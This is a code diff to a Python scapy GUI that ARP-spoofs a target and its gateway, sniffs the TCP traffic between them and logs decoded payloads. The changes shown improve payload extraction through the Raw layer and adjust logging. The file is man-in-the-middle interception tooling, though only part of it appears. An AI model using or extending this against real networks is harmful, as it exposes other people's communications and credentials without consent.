@@ -1,7 +1,7 @@
 import os
 import socket
 import psutil
-from scapy.all import ARP, Ether, srp, send, conf, sniff, IP, sendp, TCP
+from scapy.all import ARP, Ether, srp, send, conf, sniff, IP, sendp, TCP, Raw
 import tkinter as tk
 from tkinter import ttk, scrolledtext
 import threading
@@ -202,7 +202,7 @@ class NetworkScanGUI:
     @handle_exceptions
     def start_arp_spoofing(self):
         if self.spoof_thread and self.spoof_thread.is_alive():
-            self.log_message("ARP spoofing is already in progress.")
+            self.log_message("ARP spoofing is already in progress.", 'blue')
             return
         target_ip = self.target_ip_entry.get()
         gateway_ip = self.gateway_ip_entry.get()
@@ -211,13 +211,13 @@ class NetworkScanGUI:
             self.spoof_thread_stop_event.clear()
             self.sniff_thread_stop_event.clear()
 
-            self.log_message(f"Starting ARP spoofing: Target IP={target_ip}, Gateway IP={gateway_ip}", 'green')
+            self.log_message(f"Starting ARP spoofing: Target IP={target_ip}, Gateway IP={gateway_ip}", 'blue')
             self.spoof_thread = threading.Thread(target=self.arp_spoof, args=(target_ip, gateway_ip))
             self.spoof_thread.start()
             self.sniff_thread = threading.Thread(target=self.sniff_packets, args=(target_ip, gateway_ip))
             self.sniff_thread.start()
         else:
-            self.log_message("Please provide both Target IP and Gateway IP.")
+            self.log_message("Please provide both Target IP and Gateway IP.", 'red')
 
     def safe_stop_arp_spoofing(self):
         self.safe_method(self.stop_arp_spoofing)
@@ -286,7 +286,7 @@ class NetworkScanGUI:
         filter_str = f"tcp and ((src host {target_ip} and dst host {gateway_ip}) or (src host {gateway_ip} and dst host {target_ip}))"
         try:
             while not self.sniff_thread_stop_event.is_set():
-                packets = sniff(filter=filter_str, count=3, timeout=10, iface=interface)
+                packets = sniff(filter=filter_str, count=5, timeout=10, iface=interface)
                 for packet in packets:
                     self.log_packet(packet)
                     self.forward_packet(packet, target_ip, gateway_ip)
@@ -297,16 +297,19 @@ class NetworkScanGUI:
     def log_packet(self, packet):
         if packet.haslayer(TCP) and packet.haslayer(IP):
             # Extract the TCP payload
-            tcp_payload = bytes(packet[TCP].payload)
-            if tcp_payload:
-                try:
-                    # Decode the payload as UTF-8
-                    decoded_payload = self.decode_payload(tcp_payload)
-                    if len(decoded_payload) != 0:
-                        self.log_message(f'{packet[IP].src} :  {decoded_payload}', 'blue')
-                except UnicodeDecodeError as e:
-                    self.log_message(f"Failed to decode TCP payload: {e}", 'red')
-
+            if packet.haslayer(Raw):
+                tcp_payload = bytes(packet[Raw].load)
+                if tcp_payload:
+                    try:
+                        # Decode the payload as UTF-8
+                        decoded_payload = self.decode_payload(tcp_payload)
+                        if decoded_payload:
+                            print(f'{packet[IP].src} : {decoded_payload}')
+                            self.log_message(f'{packet[IP].src} :  {decoded_payload}', 'green')
+                    except UnicodeDecodeError as e:
+                        print(f"Failed to decode TCP payload: {e}")
+                        self.log_message(f"Failed to decode TCP payload: {e}", 'red')
+                    
     def decode_payload(self, payload):
         try:
             return payload.decode('utf-8')
